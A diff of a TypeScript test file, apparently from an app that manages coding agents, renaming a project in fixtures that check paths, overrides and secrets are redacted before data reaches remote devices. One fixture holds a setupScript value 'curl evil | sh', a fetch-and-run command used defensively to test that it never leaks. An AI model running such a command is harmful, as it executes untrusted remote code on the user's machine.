@@ -188,13 +188,13 @@ describe('redactSnapshotForRemote', () => {
 
   it('shortens defaultProject, projectPath, project paths and file paths to two segments', () => {
     const snapshot = {
-      agents: [{ id: 'a_1', defaultProject: 'C:\\Users\\sam\\repos\\bloblex\\apps\\desktop' }],
+      agents: [{ id: 'a_1', defaultProject: 'C:\\Users\\sam\\repos\\retinue\\apps\\desktop' }],
       projects: [{ id: 'pr_1', path: 'C:\\Users\\sam\\deep\\project' }],
       sessions: [
         {
           id: 's_1',
-          projectPath: 'C:\\Users\\sam\\repos\\bloblex\\apps',
-          files: [{ id: 'f_1', path: 'C:\\Users\\sam\\repos\\bloblex\\src\\main.ts' }],
+          projectPath: 'C:\\Users\\sam\\repos\\retinue\\apps',
+          files: [{ id: 'f_1', path: 'C:\\Users\\sam\\repos\\retinue\\src\\main.ts' }],
         },
         { id: 's_2', projectPath: 'relative/project' },
       ],
@@ -202,7 +202,7 @@ describe('redactSnapshotForRemote', () => {
     const safe = redactSnapshotForRemote(snapshot) as Record<string, any>
     expect(safe.agents[0].defaultProject).toBe('apps/desktop')
     expect(safe.projects[0].path).toBe('deep/project')
-    expect(safe.sessions[0].projectPath).toBe('bloblex/apps')
+    expect(safe.sessions[0].projectPath).toBe('retinue/apps')
     expect(safe.sessions[0].files[0].path).toBe('src/main.ts')
     expect(safe.sessions[1].projectPath).toBe('relative/project')
   })
@@ -310,8 +310,8 @@ describe('redactSnapshotForRemote', () => {
 
   it('never lets a project overrides object (setup script, mode) reach a device', () => {
     const overrides = { models: { codex: 'm' }, approvalMode: 'bypass', setupScript: 'curl evil | sh' }
-    const safe = redactSnapshotForRemote({ projects: [{ id: 'p_1', name: 'Blolblex', overrides }], agents: [] }) as Record<string, any>
-    expect(safe.projects[0].name).toBe('Blolblex')
+    const safe = redactSnapshotForRemote({ projects: [{ id: 'p_1', name: 'Retinue', overrides }], agents: [] }) as Record<string, any>
+    expect(safe.projects[0].name).toBe('Retinue')
     expect(safe.projects[0].overrides).toBeUndefined()
     const listed = redactResultForRemote('project.list', { projects: [{ id: 'p_1', overrides }] }) as Record<string, any>
     expect(JSON.stringify(listed)).not.toContain('curl evil')
@@ -321,7 +321,7 @@ describe('redactSnapshotForRemote', () => {
     const snapshot = {
       sequence: 42,
       agents: [{ id: 'a_1', instructions: 'Do the thing.', customEnv: { LANG: 'en_US.UTF-8' }, customArgs: ['--x'] }],
-      sessions: [{ id: 's_1', projectPath: 'C:\\Users\\sam\\repos\\bloblex\\apps\\desktop', providerSessionId: 't' }],
+      sessions: [{ id: 's_1', projectPath: 'C:\\Users\\sam\\repos\\retinue\\apps\\desktop', providerSessionId: 't' }],
       runtimes: [{ id: 'rt_1', executablePath: 'C:\\Tools\\codex.exe', launchArgs: ['--a'] }],
     }
     const safe = redactSnapshotForRemote(snapshot)
@@ -329,7 +329,7 @@ describe('redactSnapshotForRemote', () => {
     expect(snapshot.agents[0].instructions).toBe('Do the thing.')
     expect(snapshot.agents[0].customEnv).toEqual({ LANG: 'en_US.UTF-8' })
     expect(snapshot.agents[0].customArgs).toEqual(['--x'])
-    expect(snapshot.sessions[0].projectPath).toBe('C:\\Users\\sam\\repos\\bloblex\\apps\\desktop')
+    expect(snapshot.sessions[0].projectPath).toBe('C:\\Users\\sam\\repos\\retinue\\apps\\desktop')
     expect(snapshot.sessions[0].providerSessionId).toBe('t')
     expect(snapshot.runtimes[0].executablePath).toBe('C:\\Tools\\codex.exe')
     expect(snapshot.runtimes[0].launchArgs).toEqual(['--a'])
@@ -359,7 +359,7 @@ describe('redactResultForRemote', () => {
     const session = {
       id: 's_1',
       providerSessionId: 'thread_opaque',
-      projectPath: 'C:\\Users\\sam\\repos\\bloblex\\apps\\desktop',
+      projectPath: 'C:\\Users\\sam\\repos\\retinue\\apps\\desktop',
       messages: [{ id: 'm_1', content: 'hello', attachments: [{ name: 'a.png', path: 'C:\\pics\\a.png' }] }],
       tools: [{ id: 't_1', detail: { output: 'SECRET=1' } }],
     }
@@ -398,7 +398,7 @@ describe('redactResultForRemote', () => {
 
   it('sends an unrouted read through the field watcher, never raw', () => {
     const safe = redactResultForRemote('project.list', {
-      projects: [{ id: 'pr_1', path: 'C:\\Users\\sam\\repos\\bloblex\\deep\\proj', secret: 'x' }],
+      projects: [{ id: 'pr_1', path: 'C:\\Users\\sam\\repos\\retinue\\deep\\proj', secret: 'x' }],
     }) as Record<string, any>
     expect(safe.projects[0].path).toBe('deep/proj')
     expect(safe.projects[0].secret).toBeUndefined()
@@ -446,7 +446,7 @@ describe('redactEventForRemote', () => {
   it('keeps the permission.requested command text but reduces absolute paths', () => {
     const safe = redactEventForRemote({
       type: 'permission.requested',
-      payload: { sessionId: 's', title: 'Run tests', detail: 'pnpm test', path: 'C:\\Users\\sam\\repos\\bloblex\\src\\a.ts' },
+      payload: { sessionId: 's', title: 'Run tests', detail: 'pnpm test', path: 'C:\\Users\\sam\\repos\\retinue\\src\\a.ts' },
     }) as Record<string, any>
     expect(safe.payload.title).toBe('Run tests')
     expect(safe.payload.detail).toBe('pnpm test')
